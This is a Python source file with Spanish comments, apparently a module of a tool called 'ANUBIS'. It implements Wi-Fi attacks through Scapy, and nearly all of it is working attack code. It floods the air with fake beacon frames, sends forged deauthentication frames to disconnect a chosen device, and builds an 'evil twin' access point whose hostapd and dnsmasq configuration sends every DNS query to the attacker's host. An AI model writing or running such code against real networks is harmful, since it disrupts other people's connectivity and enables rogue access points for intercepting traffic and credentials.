import os
import time
import subprocess
import threading
import sys

# ==========================================
# 🛡️ CAPA DE COMPATIBILIDAD (BYPASS)
# ==========================================
try:
    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp, RandMAC, Dot11Deauth
    ESPACIO_RADIO_DISPONIBLE = True
except ImportError:
    ESPACIO_RADIO_DISPONIBLE = False
    # Definimos clases vacías para evitar que el código explote en Windows

    class RadioTap:
        pass

    class Dot11:
        pass

    def RandMAC(): return "00:00:00:00:00:00"
    def sendp(*args, **kwargs): pass


class WifiAttack:
    def __init__(self, sentinel):
        self.sentinel = sentinel
        self.iface_mon = "wlan0mon"
        self.iface_ap = "wlan0"
        self.ataca_activo = False

        if not ESPACIO_RADIO_DISPONIBLE:
            print(
                "\033[1;33m[!] ADVERTENCIA: Scapy/Drivers no detectados. Modo SIMULACIÓN activo.\033[0m")

    # ==========================================
    # 📡 OPERACIONES DE INTERFERENCIA
    # ==========================================

    def beacon_spam(self, ssid_base="ANUBIS_"):
        """Inunda el aire con redes falsas para confundir escáneres."""
        self.ataca_activo = True

        if not ESPACIO_RADIO_DISPONIBLE:
            print(
                f"[SIMULACIÓN] Generando tráfico Beacon falso para: {ssid_base}...")
        else:
            print(f"[*] Lanzando Beacon Spam real en {self.iface_mon}...")

        self.sentinel.reportes.registrar_evento(
            "WIFI", f"Iniciando Beacon Spam: {ssid_base}")

        def spam():
            while self.ataca_activo:
                if not ESPACIO_RADIO_DISPONIBLE:
                    time.sleep(2)  # Simula latencia de red
                    continue

                for i in range(20):
                    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                                  addr2=RandMAC(), addr3=RandMAC())
                    beacon = Dot11Beacon(cap="ESS+privacy")
                    nombre_red = f"{ssid_base}{i:02}"
                    essid = Dot11Elt(
                        ID="SSID", info=nombre_red, len=len(nombre_red))
                    frame = RadioTap()/dot11/beacon/essid
                    sendp(frame, iface=self.iface_mon,
                          count=1, inter=0.1, verbose=0)
                time.sleep(0.1)

        threading.Thread(target=spam, daemon=True).start()

    def deauth(self, target_mac, ap_mac):
        """Desconecta un dispositivo del AP."""
        if not ESPACIO_RADIO_DISPONIBLE:
            print(
                f"[SIMULACIÓN] Enviando paquetes Deauth ficticios: {target_mac} -> {ap_mac}")
            return

        print(f"[*] Desautenticando {target_mac} de {ap_mac}...")
        pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac,
                               addr3=ap_mac)/Dot11Deauth(reason=7)
        sendp(pkt, iface=self.iface_mon, count=100, inter=0.1, verbose=0)
        self.sentinel.reportes.registrar_evento(
            "WIFI", f"Deauth real enviado a {target_mac}")

    # ==========================================
    # 🕷️ OPERACIÓN GEMELO MALVADO (EVIL TWIN)
    # ==========================================

    def detener_servicios_conflicto(self):
        if sys.platform != "linux":
            print("[SIMULACIÓN] Deteniendo servicios de red conflictivos...")
            return

        subprocess.run(["sudo", "systemctl", "stop",
                       "NetworkManager"], check=False)
        subprocess.run(["sudo", "killall", "hostapd", "dnsmasq"], check=False)

    def crear_gemelo_malvado(self, ssid, canal=6):
        self.detener_servicios_conflicto()
        print(f"\n[!] INICIANDO OPERACIÓN GEMELO MALVADO: {ssid}")

        if sys.platform != "linux":
            print(
                f"[SIMULACIÓN] Configurando AP Virtual '{ssid}' en canal {canal}...")
            print("[SIMULACIÓN] Redirección DNS 192.168.1.1 configurada.")
            return

        # --- Lógica de archivos de configuración (Solo Linux) ---
        hostapd_conf = f"interface={self.iface_ap}\ndriver=nl80211\nssid={ssid}\nhw_mode=g\nchannel={canal}\nauth_algs=1\nwmm_enabled=0\n"
        with open("hostapd_anubis.conf", "w") as f:
            f.write(hostapd_conf)

        dnsmasq_conf = f"interface={self.iface_ap}\ndhcp-range=192.168.1.10,192.168.1.100,8h\naddress=/#/192.168.1.1\n"
        with open("dnsmasq_anubis.conf", "w") as f:
            f.write(dnsmasq_conf)

        subprocess.run(["sudo", "ifconfig", self.iface_ap,
                       "192.168.1.1", "netmask", "255.255.255.0"])
        subprocess.Popen(
            ['sudo', 'hostapd', 'hostapd_anubis.conf'], stdout=subprocess.DEVNULL)
        subprocess.Popen(
            ['sudo', 'dnsmasq', '-C', 'dnsmasq_anubis.conf', '-d'], stdout=subprocess.DEVNULL)

        self.sentinel.reportes.registrar_evento(
            "WIFI", f"Evil Twin activo: {ssid}")

    def detener_ataques(self):
        self.ataca_activo = False
        print("[*] Abortando ataques y limpiando sistema...")

        if sys.platform == "linux":
            subprocess.run(
                ["sudo", "killall", "hostapd", "dnsmasq"], check=False)
            subprocess.run(["sudo", "systemctl", "start",
                           "NetworkManager"], check=False)
        else:
            print("[SIMULACIÓN] Servicios restaurados.")
